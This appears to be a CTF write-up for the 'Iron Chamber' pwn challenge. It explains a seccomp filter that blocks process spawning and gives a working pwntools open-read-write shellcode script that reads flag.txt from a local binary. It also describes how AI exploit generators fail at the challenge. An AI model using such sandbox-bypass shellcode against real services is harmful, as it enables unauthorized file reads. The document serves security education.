# SecurinetsENIT CTF - Iron Chamber Technical Writeup

* Wave: 3 (Mastery & Anti-AI)
* Category: Pwn / Binary Exploitation
* Difficulty: Advanced
* Target OS: Ubuntu 22.04 LTS (x86_64)
* Mitigations:
  * Seccomp Sandbox: Active (SECCOMP_MODE_FILTER)
  * Blocks: `execve`, `execveat`, `fork`, `clone`
  * Chamber: RWX page at `0x13370000`

---

## 1. Vulnerability Analysis

The program allocates a fixed RWX memory page at `0x13370000`, reads up to 256 bytes from user input into it, and directly jumps to it as function pointer:
```c
((void (*)(void))chamber)();
```
However, immediately before executing the user payload, it initializes a strict **Seccomp BPF filter**:
```c
install_seccomp();
```

---

## 2. The Anti-AI Trap: The "Instant SIGSYS Death" of AI Prompts

When an automated AI or script generator is prompted with:
> "Here is a challenge where we can execute shellcode, generate the exploit."

The AI almost unanimously responds with standard shell-spawning shellcode:
```python
shellcode = asm(shellcraft.sh())  # invokes execve("/bin/sh", 0, 0)
```
Upon running this, the Linux kernel encounters syscall **59 (`sys_execve`)**.
The BPF filter matches:
```c
BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1),
BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)
```
The kernel immediately sends **`SIGSYS`**, killing the process without printing anything!
The AI bot sees no output, concludes the shellcode was bad, and gets stuck in an infinite loop hallucinating different shellcode variations—all of which use `execve`.

---

## 3. Investigating with `seccomp-tools`

A human reverse engineer runs:
```bash
seccomp-tools dump ./iron_chamber
```
Output:
```text
 line  OP   JT   JF   K
=================================
 0000: BPF_LD  | BPF_W | BPF_ABS    0x4
 0001: BPF_JMP | BPF_JEQ | BPF_K    0xc000003e:0003 # x86_64
 0002: BPF_RET | BPF_K              SECCOMP_RET_KILL
 0003: BPF_LD  | BPF_W | BPF_ABS    0x0
 0004: BPF_JMP | BPF_JEQ | BPF_K    0x3b:0005 # 59 = execve -> KILL
 0005: BPF_RET | BPF_K              SECCOMP_RET_KILL
 0006: BPF_JMP | BPF_JEQ | BPF_K    0x142:0007 # 322 = execveat -> KILL
 0007: BPF_RET | BPF_K              SECCOMP_RET_KILL
 0008: BPF_JMP | BPF_JEQ | BPF_K    0x38:0009 # 56 = clone -> KILL
 0009: BPF_RET | BPF_K              SECCOMP_RET_KILL
 0010: BPF_JMP | BPF_JEQ | BPF_K    0x39:0011 # 57 = fork -> KILL
 0011: BPF_RET | BPF_K              SECCOMP_RET_KILL
 0012: BPF_RET | BPF_K              SECCOMP_RET_ALLOW
```
The rule is unambiguous:
* NO process spawning allowed.
* `open` (2), `read` (0), and `write` (1) are 100% permitted.

---

## 4. Exploitation Walkthrough: Open-Read-Write (ORW)

Because we cannot spawn a shell, we do not need one!
We only need to read the contents of `flag.txt` and write them to stdout.
We craft an **ORW shellcode**:

### Step 1: `open("flag.txt", O_RDONLY)`
* System call number: `rax = 2`
* First argument: `rdi = &"flag.txt"`
* Second argument: `rsi = 0` (`O_RDONLY`)
* Returns file descriptor: `rax = 3`

### Step 2: `read(fd=3, buf=0x13370500, count=100)`
* System call number: `rax = 0`
* First argument: `rdi = 3`
* Second argument: `rsi = 0x13370500`
* Third argument: `rdx = 100`

### Step 3: `write(fd=1, buf=0x13370500, count=100)`
* System call number: `rax = 1`
* First argument: `rdi = 1` (stdout)
* Second argument: `rsi = 0x13370500`
* Third argument: `rdx = 100`

### Using pwntools:
```python
from pwn import *

context.arch = "amd64"

shellcode = shellcraft.open("flag.txt", 0)
shellcode += shellcraft.read("rax", 0x13370500, 100)
shellcode += shellcraft.write(1, 0x13370500, 100)

p = process("./iron_chamber")
p.sendafter(b"Input bytecode (max 256 bytes): ", asm(shellcode))
print(p.recvall())
```

The flag is printed directly to stdout, completely bypassing the strict process sandbox!

---

## 5. Defensive Remediation & Secure Coding

1. Never execute untrusted user input with RWX memory permissions.
2. Maintain strict separation of data and code with W^X (Write XOR Execute) memory policies.
